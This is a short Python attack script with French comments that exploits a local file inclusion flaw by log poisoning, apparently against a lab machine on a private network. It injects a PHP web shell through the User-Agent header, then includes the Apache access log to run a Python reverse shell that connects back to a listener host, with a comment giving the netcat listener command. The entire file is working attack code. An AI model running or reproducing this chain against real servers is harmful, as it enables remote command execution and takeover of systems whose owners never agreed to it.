#encoding:utf-8
import requests
# Exploitation de la faille LFI via les logs
#nc -lvp 12345 sur l'h√¥te distant

requests.get("http://192.168.4.1",headers={'User-Agent':"<?php system($_GET['cmd']); ?>"})
requests.get("http://192.168.4.1/read.php",params={"file":"/var/log/apache2/access.log","cmd":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.4.7\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})
